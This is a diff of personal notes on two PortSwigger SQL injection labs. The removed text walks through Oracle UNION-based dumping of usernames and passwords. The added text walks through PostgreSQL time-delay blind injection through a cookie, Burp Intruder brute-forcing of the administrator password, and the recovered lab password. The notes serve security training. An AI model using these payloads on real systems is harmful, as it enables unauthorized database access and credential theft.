@@ -1,44 +1,65 @@
 
-### SQL injection attack, listing the database contents on Oracle
+### Blind SQL injection with time delays and information retrieval : PRACTITIONER
 
 ---
 
-> First, identify the number of output fields in the query. Do that using the adding `NULL` method. It is an oracle DB, so must add `FROM DUAL`.
-```
-' UNION SELECT NULL, NULL FROM DUAL--
-```
-> it has 2 output fields.
+We will be injecting in the `TrackingId` cookie, testing the time delay blind injection.
 
-> Next, we determine the type of the output fields. We need to extract a username and a password, so we are looking for text type string.
+Test the injection point assuming PostgreSQL.
 ```
-' UNION SELECT 'a', NULL FROM DUAL-- 
-' UNION SELECT NULL, 'a' FROM DUAL--
+' || pg_sleep(10) --
 ```
-> Both work, hence both are strings.
+- The response completes after 10 seconds, therefore, it is vulnerable to time delay injection.
 
-> Since this is oracle, we can use `all_tables` to enumerate the tables of this database.
+Check for the presence of the `users` table using a time delay.
 ```
-' UNION SELECT TABLE_NAME, NULL FROM all_tables --
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users --
 ```
-> Choosing to attack the `USERS_QTKCOM` table.
+- See that the response comes after 10 seconds, implying that the users table exists.
 
-> We need to find the column names of this table to check that they are indeed the usernames and passwords as required.
+Now checking for the administrator username.
 ```
-' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_QTKCOM' --
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator') -- 
+```
+- Response comes after 10 seconds, hence, the administrator username exists.
+
+>Using BURPSUITE INTRUDER spider attack with the placeholder at the length, we can enumerate the length of the password.
+
+```
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND LENGTH(password)>20 ) -- 
+```
+- See that at 20, it sends the response immediately, meaning that it is 20 characters long.
+
+> Now, using the BURPSUITE INTRUDER cluster bomb attack, we can obtain the characters of each index in the password.
+
+```
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND  SUBSTRING(password,1,1) ='a') -- 
 ```
 
-> 2 new rows were output that contain the column name for usernames and passowrds.
-* PASSWORD_TMVXQH
-* USERNAME_SITQKU
+Similar to [[Portswigger/SQL Injection/Lab 7]], brute force the password with the indices from 1-20 and the characters from a-z and 0-9.
+- Check the response received column, those with the delay have the correct values.
 
-> Now, we need to get the data inside these columns using a normal query
-```
-' UNION SELECT USERNAME_SITQKU, PASSWORD_TMVXQH FROM USERS_QTKCOM --
-```
-> This outputs the usernames and passowrds in new rows.
+1 - y
+2 - v
+3 - l
+4 - r
+5 - z
+6 - p
+7 - w
+8 - k
+9 - 9
+10 - v
+11 - j
+12 - 4
+13 - a
+14 - 6
+15 - g
+16 - n
+17 - 1
+18 - j
+19 - d
+20 - k
 
-![usersandpass](./screenshots/usernamepass.png)
-
-> We can now login as admin and complete the lab.
+Submit the password and login as admin to complete lab.
 
 ---
